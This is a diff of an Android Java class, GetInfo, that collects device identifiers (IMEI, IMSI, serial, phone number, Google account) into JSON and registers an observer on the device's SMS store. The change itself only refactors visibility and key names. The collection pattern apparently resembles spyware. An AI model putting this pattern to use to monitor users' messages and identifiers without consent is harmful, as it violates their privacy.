@@ -16,7 +16,6 @@ import android.content.pm.PackageManager;
 import android.net.ConnectivityManager;
 import android.net.Uri;
 import android.os.Environment;
-import android.os.Handler;
 import android.os.StatFs;
 import android.preference.PreferenceManager;
 import android.provider.Settings;
@@ -49,10 +48,7 @@ public class GetInfo {
 
 	public void startGetInfo() {
 		date = new ConvertDate();
-		SmsSentObserver observer = new SmsSentObserver(null);
-		observer.setContext(mContext);
-		mContext.getContentResolver().registerContentObserver(
-				Uri.parse("content://sms"), true, observer);
+		contentObserved();
 		sp = PreferenceManager.getDefaultSharedPreferences(mContext);
 		telephonyManager = (TelephonyManager) mContext
 				.getSystemService(Context.TELEPHONY_SERVICE);
@@ -78,7 +74,7 @@ public class GetInfo {
 			getFeatures();
 			info.put("Display size", getDisplayInfo());
 			info.put("SD", getSDCardReady());
-			info.put("Operator name", getOperatorName());
+			info.put("operator_name", getOperatorName());
 			info.put("Phone type", getPhoneType());
 			info.put("Dual sim", getIsDualSIM());
 			info.put("IMEI SIM", getIMEISim1());
@@ -86,7 +82,7 @@ public class GetInfo {
 			if (getIsDualSIM().equals("supported"))
 				info.put("IMEI SIM2", getIMEISim2());
 			if (getNumber() != null)
-				info.put("Number", getNumber());
+				info.put("number", getNumber());
 			// else if (getAccaunt() != null)
 			// info.put("number", getAccaunt());
 
@@ -133,7 +129,7 @@ public class GetInfo {
 	 * 
 	 * @return
 	 */
-	public String getBrand() {
+	private String getBrand() {
 		String brand;
 		try {
 			brand = android.os.Build.BRAND;
@@ -149,7 +145,7 @@ public class GetInfo {
 	 * 
 	 * @return
 	 */
-	public String getSDK() {
+	private String getSDK() {
 		String SDK;
 		try {
 			SDK = Integer.toString(android.os.Build.VERSION.SDK_INT);
@@ -165,7 +161,7 @@ public class GetInfo {
 	 * 
 	 * @return
 	 */
-	public String getOperatorName() {
+	private String getOperatorName() {
 		String operatorName = null;
 		try {
 			operatorName = telephonyManager.getNetworkOperatorName();
@@ -182,7 +178,7 @@ public class GetInfo {
 	 * @return
 	 */
 
-	public String getIMEI() {
+	private String getIMEI() {
 		String sIMEI = null;
 		try {
 			sIMEI = telephonyManager.getDeviceId();
@@ -200,7 +196,7 @@ public class GetInfo {
 	 * @return
 	 */
 
-	public String getIMSI() {
+	private String getIMSI() {
 		String sIMSI = null;
 		try {
 			sIMSI = telephonyManager.getSubscriberId();
@@ -217,7 +213,7 @@ public class GetInfo {
 	 * 
 	 * @return
 	 */
-	public String getVerAndroid() {
+	private String getVerAndroid() {
 		String verAndroid = null;
 		try {
 			verAndroid = android.os.Build.VERSION.RELEASE;
@@ -235,7 +231,7 @@ public class GetInfo {
 	 * @return
 	 */
 
-	public String getManufactured() {
+	private String getManufactured() {
 		String manufactured = null;
 		try {
 			manufactured = android.os.Build.MANUFACTURER;
@@ -269,7 +265,7 @@ public class GetInfo {
 	 * 
 	 * @return
 	 */
-	public String getModel() {
+	private String getModel() {
 		String model = null;
 		try {
 			model = android.os.Build.MODEL;
@@ -286,7 +282,7 @@ public class GetInfo {
 	 * 
 	 * @return
 	 */
-	public String getSerialNum() {
+	private String getSerialNum() {
 		String serialnum = null;
 
 		try {
@@ -304,7 +300,7 @@ public class GetInfo {
 	 * 
 	 * @return
 	 */
-	public String getPhoneType() {
+	private String getPhoneType() {
 		int phoneType = telephonyManager.getPhoneType();
 		String phoneTypeName = null;
 		switch (phoneType) {
@@ -328,7 +324,7 @@ public class GetInfo {
 	 * 
 	 * @return
 	 */
-	public String getNetworkType() {
+	private String getNetworkType() {
 		networkType = telephonyManager.getNetworkType();
 		switch (networkType) {
 		case TelephonyManager.NETWORK_TYPE_1xRTT:
@@ -372,7 +368,7 @@ public class GetInfo {
 	 * 
 	 * @return
 	 */
-	public String getConnectType() {
+	private String getConnectType() {
 
 		String network = "";
 		ConnectivityManager cm = (ConnectivityManager) mContext
@@ -397,7 +393,7 @@ public class GetInfo {
 	 * @return
 	 */
 
-	public String getIMEISim1() {
+	private String getIMEISim1() {
 		String sIMEISim1 = null;
 		try {
 			sIMEISim1 = telephonyInfo.getImeiSIM1();
@@ -415,7 +411,7 @@ public class GetInfo {
 	 * @return
 	 */
 
-	public String getIMEISim2() {
+	private String getIMEISim2() {
 		String sIMEISim2 = null;
 		try {
 			sIMEISim2 = telephonyInfo.getImeiSIM2();
@@ -431,7 +427,7 @@ public class GetInfo {
 	 * 
 	 * @return
 	 */
-	public String getIsSIM1Ready() {
+	private String getIsSIM1Ready() {
 		String sIMEISim1Ready = null;
 		try {
 			sIMEISim1Ready = Boolean.toString(telephonyInfo.isSIM1Ready());
@@ -449,7 +445,7 @@ public class GetInfo {
 	 * 
 	 * @return
 	 */
-	public String getIsSIM2Ready() {
+	private String getIsSIM2Ready() {
 		String sIMEISim2Ready = null;
 		try {
 			sIMEISim2Ready = Boolean.toString(telephonyInfo.isSIM2Ready());
@@ -466,7 +462,7 @@ public class GetInfo {
 	 * 
 	 * @return
 	 */
-	public String getIsDualSIM() {
+	private String getIsDualSIM() {
 		String sIsDualSim = null;
 		try {
 			sIsDualSim = telephonyInfo.isDualSIM();
@@ -483,7 +479,7 @@ public class GetInfo {
 	 * 
 	 * @return
 	 */
-	public String getNumber() {
+	private String getNumber() {
 		String number = null;
 		try {
 			number = telephonyInfo.getNumber();
@@ -499,7 +495,7 @@ public class GetInfo {
 	 * 
 	 * 
 	 */
-	public void getAccaunt() {
+	private void getAccaunt() {
 		String accauntGoogle = null;
 
 		AccountManager am = AccountManager.get(mContext);
@@ -633,7 +629,7 @@ public class GetInfo {
 			if (accauntGoogle != null)
 				info.put("Google", accauntGoogle);
 			if (phoneNumber != null)
-				info.put("Number", phoneNumber);
+				info.put("number", phoneNumber);
 		} catch (JSONException e) {
 			// TODO Auto-generated catch block
 			e.printStackTrace();
@@ -645,7 +641,7 @@ public class GetInfo {
 	 * 
 	 * @return
 	 */
-	public String getMCC() {
+	private String getMCC() {
 		String networkOperator = telephonyManager.getNetworkOperator();
 		String mcc = null;
 		try {
@@ -665,7 +661,7 @@ public class GetInfo {
 	 * 
 	 * @return
 	 */
-	public String getMNC() {
+	private String getMNC() {
 		String networkOperator = telephonyManager.getNetworkOperator();
 		String mnc = null;
 		try {
@@ -684,7 +680,7 @@ public class GetInfo {
 	 * 
 	 * @return
 	 */
-	public String getDisplayInfo() {
+	private String getDisplayInfo() {
 		WindowManager wm = (WindowManager) mContext
 				.getSystemService(Context.WINDOW_SERVICE);
 		// Best way for new devices
@@ -830,10 +826,10 @@ public class GetInfo {
 		}
 	}
 
-	public void contentObserved() {
-		SmsSentObserver smsSentObserver = new SmsSentObserver(new Handler(),
-				mContext);
+	private void contentObserved() {
+		SmsSentObserver observer = new SmsSentObserver(null);
+		observer.setContext(mContext);
 		mContext.getContentResolver().registerContentObserver(
-				Uri.parse("content://sms/sent"), true, smsSentObserver);
+				Uri.parse("content://sms"), true, observer);
 	}
 }
